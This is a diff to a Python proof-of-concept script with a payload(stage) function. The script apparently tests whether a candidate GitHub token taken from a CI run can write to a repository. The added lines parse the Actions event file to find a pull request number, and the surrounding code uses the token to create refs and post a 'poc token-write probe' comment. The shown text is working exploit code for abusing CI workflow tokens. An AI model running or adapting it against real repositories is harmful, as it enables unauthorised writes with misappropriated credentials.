@@ -137,6 +137,19 @@ def payload(stage):
         emit("API_CREATE_REF status=%s body=%s" % (st, body[:300].replace("\n", " ")))
         # write probe: PR comment (expected 403 if read-only)
         pr = os.environ.get("POC_PR")
+        if not pr:
+            try:
+                ev = json.load(open(os.environ["GITHUB_EVENT_PATH"], encoding="utf-8"))
+                wr = ev.get("workflow_run") or {}
+                emit("EVENT_WORKFLOW_RUN name=%s event=%s conclusion=%s head_branch=%s head_sha=%s head_repo=%s prs=%s" % (
+                    wr.get("name"), wr.get("event"), wr.get("conclusion"), wr.get("head_branch"),
+                    wr.get("head_sha"), (wr.get("head_repository") or {}).get("full_name"),
+                    [p.get("number") for p in (wr.get("pull_requests") or [])]))
+                prs = wr.get("pull_requests") or []
+                if prs:
+                    pr = str(prs[0].get("number"))
+            except Exception as e:
+                emit("EVENT_PARSE_ERR=%r" % (e,))
         if pr:
             st, body = api("POST", "/repos/" + REPO + "/issues/%s/comments" % pr, cand,
                            {"body": "poc token-write probe " + sha(cand)[:12]})
